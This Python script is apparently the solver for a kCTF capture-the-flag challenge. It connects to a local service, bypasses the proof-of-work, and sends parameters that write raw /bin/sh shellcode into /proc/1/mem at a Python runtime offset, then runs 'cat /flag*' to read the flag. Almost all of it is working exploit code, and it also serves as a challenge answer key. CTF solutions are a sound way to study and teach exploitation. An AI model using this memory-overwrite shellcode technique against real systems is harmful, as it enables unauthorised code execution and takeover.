#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

# readelf -a /chroot/usr/bin/python3 | grep _PyRuntime_Finalize | awk '{print $2}'
offset = 0x6b0560
pid = 1
params = b'of=/proc/%d/mem seek=%d bs=1' % (pid, offset)
shellcode = b'\xd7\xba\x00\x00\x00\x00\xd7\xb8;\x00\x00\x00fhh\x00fh/sfhinfh/bT_RWT^\x0f\x05'

r.recvuntil(b'line?: ')
r.sendline(params)
r.recvuntil(b'it?: ')
r.sendline(shellcode)

for _ in range(5):
	r.sendline('cat /flag*')
print(r.recvuntil(b'CTF{'))
print(r.recvuntil(b'}'))

exit(0)
